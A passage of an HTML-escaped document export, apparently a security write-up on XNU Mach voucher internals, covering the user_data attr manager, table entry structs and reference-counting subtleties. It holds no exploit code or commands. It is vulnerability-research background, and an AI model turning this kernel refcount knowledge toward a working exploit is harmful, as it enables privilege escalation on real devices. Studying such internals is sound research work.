class=\"BGLtzooHlW-c11\"&gt;int&lt;/span&gt;&lt;span&gt;&amp;nbsp;containing some flags; the other five fields are function pointers which define the semantics of the particular attr type. Here&amp;#39;s the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ipc_voucher_attr_manager&lt;/span&gt;&lt;span&gt;&amp;nbsp;structure for the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;type:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.24cf1225ae06e4faa7d9d726ded665d4facb053f\"&gt;&lt;/a&gt;&lt;a id=\"t.7\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;const&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;struct&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;ipc_voucher_attr_manager user_data_manager &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;.&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivam_release_value &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp;user_data_release_value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;.&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivam_get_value &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;user_data_get_value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;.&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivam_extract_content &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;user_data_extract_content&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;.&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivam_command &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;user_data_command&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;.&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivam_release &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;user_data_release&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;.&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivam_flags &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;IVAM_FLAGS_NONE&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;};&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;Those five function pointers are the only interface from the generic voucher code into the type-specific code. The interface may seem simple but there are some tricky subtleties in there; we&amp;#39;ll get to that later!&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;Let&amp;#39;s go back to the generic &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ipc_voucher_attr_control&lt;/span&gt;&lt;span&gt;&amp;nbsp;structure which maintains the &amp;quot;values&amp;quot; for each key in a type-agnostic way. The most important field is &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivac_entry_t &amp;nbsp;ivac_table&lt;/span&gt;&lt;span&gt;, which is &lt;/span&gt;&lt;span&gt;an array of &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivac_entry_s&lt;/span&gt;&lt;span&gt;&amp;#39;s&lt;/span&gt;&lt;span&gt;. It&amp;#39;s an index into this table which is stored in each voucher&amp;#39;s &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;iv_table&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;Here&amp;#39;s the structure of each entry in that table:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.777c9f9c4271dfb1023047f7a3639b98f2fed9d2\"&gt;&lt;/a&gt;&lt;a id=\"t.8\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;struct&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;ivac_entry_s &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; iv_value_handle_t ivace_value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; iv_value_refs_t &amp;nbsp; ivace_layered&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;:&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;1&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* layered effective entry */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace_releasing&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;:&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;1&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* release in progress */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace_free&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;:&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;1&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* on freelist */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace_persist&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;:&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;1&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* Persist the entry, don&amp;#39;t&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;count made refs */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace_refs&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;:&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;28&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* reference count */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;union&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; iv_value_refs_t ivaceu_made&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* made count (non-layered) */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; iv_index_t &amp;nbsp; &amp;nbsp; &amp;nbsp;ivaceu_layer&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* next effective layer&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; (layered) */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;ivace_u&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; iv_index_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;ivace_next&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* hash or freelist */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; iv_index_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;ivace_index&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* hash head (independent) */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;};&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_refs&lt;/span&gt;&lt;span&gt;&amp;nbsp;is a reference count for this table index. Note that this entry is &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c17\"&gt;inline&lt;/span&gt;&lt;span&gt;&amp;nbsp;in an array;&lt;/span&gt;&lt;span&gt;&amp;nbsp;so this reference count going to zero doesn&amp;#39;t cause the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivac_entry_s&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;to be free&amp;#39;d back to a kernel allocator (like the zone allocator for example.) Instead, it moves this table index onto a freelist of empty entries. The table can grow but never shrink.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;Table entries which aren&amp;#39;t free store a type-specific &amp;quot;handle&amp;quot; in &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;. Here&amp;#39;s the typedef chain for that type:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.9c51000ec2d891dfe4854f95d2bbcf210598beb6\"&gt;&lt;/a&gt;&lt;a id=\"t.9\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;iv_value_handle_t ivace_value&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;typedef&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;mach_voucher_attr_value_handle_t iv_value_handle_t&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;typedef&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;uint64_t mach_voucher_attr_value_handle_t&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;The handle is a &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;uint64_t&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;but in reality the attrs can (and do) store pointers there, hidden behind casts.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;A guarantee made by the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;attr_control&lt;/span&gt;&lt;span&gt;&amp;nbsp;is that there will only ever be one (live) &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivac_entr&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;y_s&lt;/span&gt;&lt;span&gt;&amp;nbsp;for a particular &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_value&lt;/span&gt;&lt;span&gt;. This means that each time a new &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;needs an &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivac_entry&lt;/span&gt;&lt;span&gt;&amp;nbsp;the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;attr_control&lt;/span&gt;&lt;span&gt;&amp;#39;s &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivac_table&lt;/span&gt;&lt;span&gt;&amp;nbsp;needs to be searched to see if a matching value is already present. To speed this up in-use &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivac_entries&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;are linked together in hash buckets so that a (hopefully significantly) shorter linked-list of entries can be searched rather than a linear scan of the whole table. (Note that it&amp;#39;s not a linked-list of pointers; each link in the chain is an index into the table.)&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"BGLtzooHlW-c5 BGLtzooHlW-c18\" id=\"h.lsgi9jwnyyz4\"&gt;&lt;span class=\"BGLtzooHlW-c20\"&gt;Userdata attrs&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data&lt;/span&gt;&lt;span&gt;&amp;nbsp;is one of the four types of supported, implemented voucher attr types. It&amp;#39;s only purpose is to manage buffers of arbitrary, user controlled data. Since the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;attr_control&lt;/span&gt;&lt;span&gt;&amp;nbsp;performs deduping only on the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;(which is a pointer) the userdata attr manager is responsible for ensuring that userdata values which have identical buffer values (matching length and bytes) have identical pointers.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;To do this it maintains a hash table of &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data_value_element&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;structures, which wrap a variable-sized buffer of bytes:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.300b9d1f1ee1dcff9a3ee0de164a2bc6bc43ea65\"&gt;&lt;/a&gt;&lt;a id=\"t.10\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;struct&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;user_data_value_element &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; mach_voucher_attr_value_reference_t e_made&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; mach_voucher_attr_content_size_t &amp;nbsp; &amp;nbsp;e_size&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; iv_index_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;e_sum&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; iv_index_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;e_hash&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; queue_chain_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; e_hash_link&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; uint8_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; e_data&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;[];&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;};&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;Each inline &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;e_data&lt;/span&gt;&lt;span&gt;&amp;nbsp;buffer can be up to 16KB. &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;e_hash_link&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;stores the hash-table bucket list pointer.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;is not a simple reference count. Looking through the code you&amp;#39;ll notice that there are no places where it&amp;#39;s ever decremented. Since there should (nearly) always be a 1:1 mapping between an &lt;/span&gt;&lt;span 